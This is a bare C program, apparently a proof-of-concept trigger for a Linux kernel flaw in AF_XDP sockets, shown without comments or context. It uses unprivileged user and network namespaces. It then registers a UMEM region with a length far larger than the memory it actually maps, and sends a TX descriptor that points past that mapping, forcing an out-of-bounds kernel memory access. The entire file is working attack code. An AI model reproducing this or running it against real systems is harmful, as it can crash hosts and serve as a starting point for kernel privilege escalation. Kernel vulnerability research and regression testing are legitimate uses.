#define _GNU_SOURCE
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <net/if.h>
#include <linux/bpf.h>
#include <unistd.h>
#include <linux/if_xdp.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <linux/rtnetlink.h>
#include <sys/resource.h>
#include <linux/if_packet.h>

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while(0)
typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
#define XDP_UMEM_UNALIGNED_CHUNK_FLAG (1 << 0)
#define PF_XDP 44
#define SOL_XDP	283
#define XDP_UMEM_REG 4
#define XDP_RX_RING 2
#define XDP_TX_RING 3
#define XDP_UMEM_FILL_RING 5
#define XDP_UMEM_COMPLETION_RING 6
#define XDP_USE_NEED_WAKEUP (1 << 3)
#define XDP_MMAP_OFFSETS 1

void* umem;
void* cr;
void* tx;

struct my_xdp_umem_reg {
	u64 addr; /* Start of packet data area */
	u64 len; /* Length of packet data area */
	u32 chunk_size;
	u32 headroom;
	u32 flags;
};

#define BUF_SIZE 1024
char log_buf[BUF_SIZE];

void write_file(char* file_name, char* data)
{
	int f = open(file_name, O_WRONLY);
	if (f < 0)
		err_exit("open");
	int result = write(f, data, strlen(data));
	if (result < strlen(data))
		err_exit("write");
	close(f);
}

void setup_sandbox()
{
	int result;
	char buf[1024];
	uid_t uid = getuid();
	uid_t gid = getgid();
	result = unshare(CLONE_NEWUSER);
	if (result < 0)
		err_exit("unshare-CLONE-NEWUSER");
	result = unshare(CLONE_NEWNET);
	if (result < 0)
		err_exit("unshare-CLONE-NEWNET");

	// set mapping from uid(gid) inside the namespace to the outside
	write_file("/proc/self/setgroups", "deny");

	sprintf(buf, "0 %d 1\n", uid);
	write_file("/proc/self/uid_map", buf);

	sprintf(buf, "0 %d 1\n", gid);
	write_file("/proc/self/gid_map", buf);

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		err_exit("sched-setaffinity");
	}

	result = system("/sbin/ifconfig lo up");
	if (result < 0)
		err_exit("ifconfig");
}

int setup_socket()
{
	int fd = socket(PF_XDP, SOCK_RAW, 0);
	if (fd < 0)
		err_exit("socket-create");

	umem = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
	if (umem < 0)
		err_exit("mmap");

	memset(umem + 0x7000, 0x41, 0x1000 - 1);
	struct my_xdp_umem_reg mr;
	memset(&mr, 0, sizeof mr);
	mr.addr = (u64) umem;
	mr.len = 0x100000008000;
	mr.chunk_size = 0x1000;
	mr.headroom = 0;
	mr.flags = 0;

	int result = setsockopt(fd, SOL_XDP, XDP_UMEM_REG, &mr, sizeof mr);
	if (result < 0)
		err_exit("setsockopt-umem-reg");

	int entries = 4;
	result = setsockopt(fd, SOL_XDP, XDP_RX_RING, &entries, sizeof entries);
	if (result < 0)
		err_exit("setsockopt-rx-ring");

	result = setsockopt(fd, SOL_XDP, XDP_TX_RING, &entries, sizeof entries);
	if (result < 0)
		err_exit("setsockopt-tx-ring");

	result = setsockopt(fd, SOL_XDP, XDP_UMEM_FILL_RING, &entries, sizeof entries);
	if (result < 0)
		err_exit("setsockopt-fill-ring");

	result = setsockopt(fd, SOL_XDP, XDP_UMEM_COMPLETION_RING, &entries, sizeof entries);
	if (result < 0)
		err_exit("setsockopt-completion-ring");

	struct xdp_mmap_offsets off;
	int len = sizeof off;
	result = getsockopt(fd, SOL_XDP, XDP_MMAP_OFFSETS, &off, &len);
	if (result < 0)
		err_exit("getsockopt");

	tx = mmap(0, off.tx.desc +
					4 * sizeof(struct xdp_desc),
					PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
					fd, XDP_PGOFF_TX_RING);
	if (tx < 0)
		err_exit("mmap-tx-ring");

	cr = mmap(0, off.cr.desc +
					4 * sizeof(u64),
					PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
					fd, XDP_UMEM_PGOFF_COMPLETION_RING);
	if (cr < 0)
		err_exit("mmap-completion-ring");

	struct sockaddr_xdp addr;
	memset(&addr, 0, sizeof addr);
	addr.sxdp_family = PF_XDP;
	addr.sxdp_ifindex = if_nametoindex("lo");
	addr.sxdp_queue_id = 0;
	addr.sxdp_flags = XDP_USE_NEED_WAKEUP;
	result = bind(fd, (struct sockaddr *) &addr, sizeof addr);
	if (result < 0)
		err_exit("bind");

	struct xdp_desc* tx_desc = (struct xdp_desc*) (tx + off.tx.desc);
	tx_desc->addr = 0x9000;
	tx_desc->len = 0x1000 - 1;
	tx_desc->options = 0;

	u32* tx_producer = tx + off.tx.producer;
	tx_producer[0] = 1;

	int ret = sendto(fd, NULL, 0, MSG_DONTWAIT, NULL, 0);
	if (ret < 0)
		err_exit("sendto");
	return fd;
}

int main()
{
	setup_sandbox();
	puts("Setting up socket");
	int fd = setup_socket();
	return 0;
}